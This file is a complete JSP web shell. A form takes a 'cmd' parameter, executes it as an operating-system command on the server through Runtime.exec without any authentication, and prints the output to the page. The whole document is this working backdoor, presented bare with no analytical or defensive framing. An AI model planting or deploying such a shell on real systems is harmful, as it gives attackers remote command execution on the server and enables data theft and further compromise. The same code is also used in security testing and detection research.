<%@ page import="java.util.*,java.io.*"%>
<html>
    <body>
	<form method="post" name="myform" action="">
	    <input type="text" name="cmd">
	    <input type="submit" value="Send">
	</form>
	<pre>
	<%
	    if (request.getParameter("cmd") != null) {
    	        out.println("Command: " + request.getParameter("cmd") + "<BR>");
    	        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    	        OutputStream os = p.getOutputStream();
    		InputStream in = p.getInputStream();
    	        DataInputStream dis = new DataInputStream(in);
		    String disr = dis.readLine();
        	    while ( disr != null ) {
        	    out.println(disr); disr = dis.readLine(); 
	        }
	    }
        %>
	</pre>
    </body>
</html>


